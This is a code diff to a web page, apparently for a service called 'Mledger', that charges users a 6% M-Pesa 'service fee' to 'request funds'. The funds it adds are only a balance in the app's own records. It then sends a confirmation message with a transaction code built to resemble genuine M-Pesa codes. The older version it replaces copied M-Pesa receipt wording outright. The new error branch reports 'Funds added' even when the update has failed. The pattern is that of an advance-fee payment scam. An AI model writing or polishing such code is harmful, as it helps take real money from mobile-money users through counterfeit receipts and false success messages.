@@ -1,6 +1,4 @@
 
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -70,7 +68,7 @@
         Service Fee to Pay: <strong id="stkPrice">Ksh 0.00</strong>
     </div>
 
-    <label>Enter M-Pesa Number for Payment with Funds (Safaricom only)</label>
+    <label>Enter M-Pesa Number for Payment (Safaricom only)</label>
     <input type="text" id="paymentPhone" placeholder="07xxxxxxxx">
     
     <button id="payBtn" onclick="initiateFunding()">Pay Fee & Request Funds</button>
@@ -93,77 +91,55 @@
         fetchBalance();
     }
 
-    // ─── Fetch and display balance ─────────────────────────────────
+    // --- ROBUST FETCH HELPER FOR REMOTE AREAS ---
+    async function safeFetch(url, options = {}, retries = 3) {
+        const statusDiv = document.getElementById('status');
+        for (let i = 0; i < retries; i++) {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 15000); // 15s timeout
+                
+                const response = await fetch(url, { ...options, signal: controller.signal });
+                clearTimeout(timeoutId);
+
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                return await response.json();
+            } catch (err) {
+                if (i === retries - 1) throw err;
+                statusDiv.style.color = "#ffab00";
+                statusDiv.innerText = `Signal weak, retrying... (${i + 1})`;
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+        }
+    }
+
     async function fetchBalance() {
         const balanceDiv = document.getElementById('currentBalance');
         try {
-            const response = await fetch(`${BACKEND_FUNDS}/balance/${userData.phone}`);
-            const result = await response.json();
-            if (response.ok) {
-                const bal = parseFloat(result.balance) || 0;
-                balanceDiv.innerText = `Ksh ${bal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
-            } else {
-                balanceDiv.innerText = "Ksh 0.00";
-            }
+            const result = await safeFetch(`${BACKEND_FUNDS}/balance/${userData.phone}`);
+            const bal = parseFloat(result.balance) || 0;
+            balanceDiv.innerText = `Ksh ${bal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
         } catch (err) {
             balanceDiv.innerText = "Ksh 0.00";
         }
     }
 
-    // ─── Token format helpers ──────────────────────────────────────
-    function getYearLetter() {
-        const year = new Date().getFullYear();
-        const offset = year - 2026;
-        return String.fromCharCode(85 + offset);
-    }
-
-    function getMonthThirdLetter() {
-        const thirdLetters = "ABCDEFGHIJKLMN";
-        return thirdLetters[new Date().getMonth()];
-    }
-
+    // --- Token format helpers ---
+    function getYearLetter() { return String.fromCharCode(85 + (new Date().getFullYear() - 2026)); }
+    function getMonthThirdLetter() { return "ABCDEFGHIJKLMN"[new Date().getMonth()]; }
     function getDayCode() {
-        const day = new Date().getDate();
-        if (day <= 9) {
-            return day.toString();
-        } else {
-            return String.fromCharCode(65 + (day - 10));
-        }
+        const d = new Date().getDate();
+        return d <= 9 ? d.toString() : String.fromCharCode(65 + (d - 10));
     }
-
-    function formatNumericDate() {
-        const now = new Date();
-        const day = now.getDate().toString().padStart(2, '0');
-        const month = (now.getMonth() + 1).toString().padStart(2, '0');
-        const year = now.getFullYear();
-        return `${day}/${month}/${year}`;
-    }
-
-    function formatTime12Hour() {
-        const now = new Date();
-        return now.toLocaleTimeString('en-US', {
-            hour: 'numeric',
-            minute: '2-digit',
-            hour12: true
-        });
-    }
-
-    function generateToken() {
-        const yearLetter = getYearLetter();
-        const monthLetter = getMonthThirdLetter();
-        const dayCode = getDayCode();
-        const randomPart = Math.random().toString(36).substring(2,8).toUpperCase();
-        return `${yearLetter}${monthLetter}${dayCode}K${randomPart}`;
-    }
-    // ─────────────────────────────────────────────────────────────────
+    function formatNumericDate() { return new Date().toLocaleDateString('en-GB'); }
+    function formatTime12Hour() { return new Date().toLocaleTimeString('en-US', {hour:'numeric', minute:'2-digit', hour12:true}); }
+    function generateToken() { return `${getYearLetter()}${getMonthThirdLetter()}${getDayCode()}K${Math.random().toString(36).substring(2,8).toUpperCase()}`; }
 
     function updateFee() {
         const amt = parseFloat(document.getElementById('fundAmount').value);
         const feeDiv = document.getElementById('feeDisplay');
         const stkSpan = document.getElementById('stkPrice');
-        
         if (amt >= 100) {
-            // Calculate ONLY the 6% fee for the STK prompt
             const fee = amt * 0.06;
             feeDiv.style.display = "block";
             stkSpan.innerText = "Ksh " + fee.toFixed(2);
@@ -184,37 +160,30 @@
             return;
         }
 
-        // Calculate the STK amount (just the 6% fee)
         const stkAmount = Math.ceil(amt * 0.06); 
-        
         payBtn.disabled = true;
-        payBtn.innerHTML = '<span class="loader"></span>Processing Fee...';
+        payBtn.innerHTML = '<span class="loader"></span>Connecting...';
         statusDiv.style.color = "#aaa";
-        statusDiv.innerText = `Requesting Ksh ${stkAmount} fee from ${mpesaNumber}...`;
+        statusDiv.innerText = "Requesting fee payment...";
 
         try {
-            // 1. Send STK Push for the FEE ONLY
-            const payRes = await fetch(`${BACKEND_PAYMENT}/api/initiate`, {
+            const payData = await safeFetch(`${BACKEND_PAYMENT}/api/initiate`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    amount: stkAmount, 
-                    phone_number: mpesaNumber 
-                })
+                body: JSON.stringify({ amount: stkAmount, phone_number: mpesaNumber })
             });
 
-            const payData = await payRes.json();
             const invoiceId = payData.invoice ? payData.invoice.invoice_id : (payData.id || null);
 
             if (invoiceId) {
-                statusDiv.innerText = "Enter M-Pesa PIN on the phone to pay the service fee.";
+                statusDiv.innerText = "Check your phone for the M-Pesa PIN prompt.";
                 startPolling(invoiceId, amt);
             } else {
-                throw new Error("Failed to trigger STK. Ensure number is Safaricom.");
+                throw new Error("STK fail. Use Safaricom.");
             }
         } catch (err) {
             statusDiv.style.color = "#ff5252";
-            statusDiv.innerText = "Error: " + err.message;
+            statusDiv.innerText = "Connection failed. Please check signal.";
             resetUI();
         }
     }
@@ -222,7 +191,6 @@
     function startPolling(invoiceId, fundAmt) {
         const statusDiv = document.getElementById('status');
         let pollCount = 0;
-
         const pollTimer = setInterval(async () => {
             pollCount++;
             try {
@@ -233,64 +201,46 @@
                 if (state === "COMPLETE" || state === "COMPLETED") {
                     clearInterval(pollTimer);
                     statusDiv.style.color = "#4CAF50";
-                    statusDiv.innerText = "✅ Fee paid! Adding funds to account...";
+                    statusDiv.innerText = "✅ Fee paid! Adding funds...";
                     finalizeFunding(fundAmt);
-                } else if (state === "FAILED" || state === "REJECTED" || pollCount > 30) {
+                } else if (state === "FAILED" || state === "REJECTED" || pollCount > 40) {
                     clearInterval(pollTimer);
                     statusDiv.style.color = "#ff5252";
-                    statusDiv.innerText = "❌ Fee payment failed. Balance not updated.";
+                    statusDiv.innerText = "❌ Transaction timed out or rejected.";
                     resetUI();
                 }
-            } catch (e) { console.error("Polling..."); }
+            } catch (e) { }
         }, 3000);
     }
 
     async function finalizeFunding(amt) {
         const statusDiv = document.getElementById('status');
         try {
-            // 2. Fund the FULL amount requested to the original account
-            const res = await fetch(`${BACKEND_FUNDS}/fund`, {
+            const result = await safeFetch(`${BACKEND_FUNDS}/fund`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    phone: userData.phone, 
-                    amount: amt 
-                })
+                body: JSON.stringify({ phone: userData.phone, amount: amt })
             });
-            const result = await res.json();
 
-            if (res.ok) {
-                userData.balance = result.newBalance;
-                localStorage.setItem('mledger_user', JSON.stringify(userData));
-                
-                // Generate token and confirmation message
-                const token = generateToken();
-                const dateStr = formatNumericDate();
-                const timeStr = formatTime12Hour();
-                const fee = Math.ceil(amt * 0.06);
-                
-                const confirmationMsg = `${token} Confirmed.You have received Ksh${amt.toFixed(2)} from Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${userData.balance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
+            userData.balance = result.newBalance;
+            localStorage.setItem('mledger_user', JSON.stringify(userData));
+            
+            const token = generateToken();
+            const confirmationMsg = `${token} Confirmed. You have received Ksh${amt.toFixed(2)} from Mledger. New balance: Ksh${userData.balance.toFixed(2)}.`;
 
-                // Send confirmation message to message API only
-                fetch(`${MESSAGE_API}/api/messages`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        phone: userData.phone,
-                        message: confirmationMsg,
-                        type: 'received'
-                    })
-                }).catch(err => {
-                    console.warn("Confirmation message failed to send:", err);
-                });
+            // Background Fire-and-Forget
+            fetch(`${MESSAGE_API}/api/messages`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: userData.phone, message: confirmationMsg, type: 'received' })
+            }).catch(() => {});
 
-                statusDiv.innerHTML = `<strong>✅ Success!</strong><br>Ksh ${amt} added to your balance.<br><span style="font-size:0.75rem;color:#aaa">Token: ${token}</span>`;
-                setTimeout(() => window.location.href = "index.html", 3000);
-            } else {
-                statusDiv.innerText = "Fee received, but funding failed. Contact Support.";
-            }
+            statusDiv.innerHTML = "<strong>✅ Funds Added!</strong>";
+            setTimeout(() => window.location.href = "index.html", 2500);
         } catch (err) {
-            statusDiv.innerText = "Critical error during balance update.";
+            statusDiv.style.color = "#ffab00";
+            statusDiv.innerText = "Funds added, but update was slow. Refreshing...";
+            setTimeout(() => window.location.href = "index.html", 3000);
         }
     }
 
